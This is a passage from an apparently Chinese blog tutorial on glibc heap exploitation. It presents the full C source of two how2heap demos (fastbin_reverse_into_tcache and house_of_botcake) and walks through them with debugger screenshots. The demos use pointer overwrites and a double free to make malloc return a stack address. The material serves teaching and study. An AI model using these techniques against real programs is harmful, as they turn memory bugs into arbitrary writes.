<h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><h3 id="源码-19"><a href="#源码-19" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="type">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="type">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="built_in">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="type">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="type">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">    <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">    <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="type">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>(q == (<span class="type">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="调试-19"><a href="#调试-19" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193723730.png"
                      alt="image-20231014193723730"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193755564.png"
                      alt="image-20231014193755564"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193900312.png"
                      alt="image-20231014193900312"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193928870.png"
                      alt="image-20231014193928870"
                ></p>
<p>首先申请 <code>14</code> 个 <code>chunk</code> ，先后将 <code>tcache</code> 和 <code>fastbinY[4]</code> 填满。其中 <code>victim</code> 指向第 <code>8</code> 个 <code>chunk</code> 也就是 <code>fastbinY[4]</code> 的最后一个 <code>chunk_ptrs[7]</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194618108.png"
                      alt="image-20231014194618108"
                > </p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194639500.png"
                      alt="image-20231014194639500"
                ></p>
<p>将 <code>victim(ptrs[7]_fd)</code> 指向 <code>stack_var[0]</code> 的位置，然后将 <code>tcache</code> 清空。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194826822.png"
                      alt="image-20231014194826822"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195140863.png"
                      alt="image-20231014195140863"
                ></p>
<p>这次 <code>malloc</code> 将会先从 <code>fastbin</code> 头部取出一个 <code>chunk</code>，然后把 <code>fastbin</code> 清空，放入<code>tcache</code>中，因为 <code>fastbin</code> 取出时从头开始，<code>tcache</code> 又是 <code>FIFO</code> 结构， 所以放入 <code>tcache</code> 是倒序的，把 <code>stack_var</code> 也算做了一个 <code>chunk</code>，所以是满 <code>7</code> 个。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195254059.png"
                      alt="image-20231014195254059"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195309680.png"
                      alt="image-20231014195309680"
                ></p>
<p>此时再去申请一个 <code>0x50</code> 大小的 <code>chunk</code> 将会把 <code>stack_var</code> 取出来，此时 <code>q == stack_var[2]</code> 。</p>
<h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h2><p><code>libc-2.29</code> 新增加<code>double free</code>检查，方法是在 <code>tcache_entry</code> 结构体中新增加标志位 <code>key</code> 来检查 <code>chunk</code> 是否在 <code>tcache bin</code> 中。当 <code>free</code> 掉一个堆块进入 <code>tcache</code> 时，假如堆块的 <code>bk</code> 位存放的<code>key == tcache_key</code>， 就会遍历这个大小的 <code>Tcache</code> ，假如发现同地址的堆块，则触发 <code>double Free</code> 报错。因为 <code>chunk</code> 的 <code>key</code> 保存在 <code>bk</code> 位置，只需将其修改即可绕过 <code>double free</code> 检查。而 <code>house_of_botcake</code> 是另一种方法。</p>
<h3 id="源码-20"><a href="#源码-20" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">sizeof</span>(x)/<span class="built_in">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    <span class="built_in">assert</span>(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-20"><a href="#调试-20" class="headerlink" title="调试"></a>调试</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110448627.png"
                      alt="image-20231015110448627"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110515624.png"
                      alt="image-20231015110515624"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110726890.png"
                      alt="image-20231015110726890"
                ></p>
<p>首先申请<code>9</code>个 <code>non-fast_chunk</code> 和一个 <code>obstruct-chunk</code> ，将 <code>tcache</code>  填满，剩余两个放入 <code>unsorted_bin</code>，因为 <code>a</code> 与 <code>prev</code>相邻，所以会被整合在一起。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110930692.png"
                      alt="image-20231015110930692"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110909769.png"
                      alt="image-20231015110909769"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111410250.png"
                      alt="image-20231015111410250"
                ></p>
<p>从 <code>tcache</code> 头部取出一个 <code>chunk</code> ，然后再次 <code>free(a)</code>，此时 <code>chunk_a</code> 同时出现在了 <code>unsorted_bin</code> 和 <code>tcache</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111505547.png"
                      alt="image-20231015111505547"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
